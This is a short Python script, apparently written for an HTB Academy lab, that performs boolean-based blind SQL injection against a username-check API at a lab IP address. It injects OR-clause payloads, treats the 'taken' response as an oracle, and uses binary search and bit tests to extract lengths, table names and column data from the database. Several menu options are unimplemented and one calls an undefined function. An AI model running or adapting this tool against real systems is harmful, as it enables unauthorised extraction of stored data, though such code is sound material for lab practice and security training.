#!/usr/bin/python3
import json,sys,requests, time
from urllib.parse import quote_plus
from tabulate import tabulate

target = "test"

def oracle(query):
    p = quote_plus(f"{target}' OR ({query})-- -")
    r = requests.get(f"http://10.129.204.197/api/check-username.php?u={p}")
    #print(request.data)
    #print(r.text)
    j = json.loads(r.text)
    return j['status'] == 'taken'


# confirm oracle can run
"""
assert oracle("1=1")
assert not oracle("1=0")
"""

# Calculate the Length or Count
def dumpNumber(query):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"({query}) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

# Dumping string
def dumpString(query, length):
    val = ""
    for i in range(1, length+1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({query}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val


func = int(input("""HTB_ACADEMY_ORACLE
(1) Dump All DBs
(2) Dump All Tables
(3) Dump All Columns
(4) Dump All Datas
(5) Custom Search (Count or Length)
(6) Custom Search (Name)
Your Option : """))

if func == 0:
    test()

elif func == 4: 
    table = input("tables : ")
    column = input("column : ")
    results = []
    for i in range(0,100):
        row = []
        length = (dumpNumber(f"LEN((SeLEcT {column} from {table} order by {column} offset {i} rows fetch next 1 rows only))"))
        print(length)
        if length == 128:
            row.append("")
            break
        data = (dumpString(f"SeLEcT {column} from {table} order by {column} offset {i} rows fetch next 1 rows only",int(length)))
        print(data)
        row.append(data)
        if any(row):
            results.append(row)
    #print(tabulate(results, headers=columns, tablefmt="grid"))

elif func == 5: # sample:
    payload = input("Payload : ")
    print(dumpNumber(payload))

elif func == 6: # sample:
    payload = input("Payload : ")
    length = dumpNumber(payload)
    #string, length = payload.rsplit(maxsplit=1)
    print(dumpString(payload,int(length)))
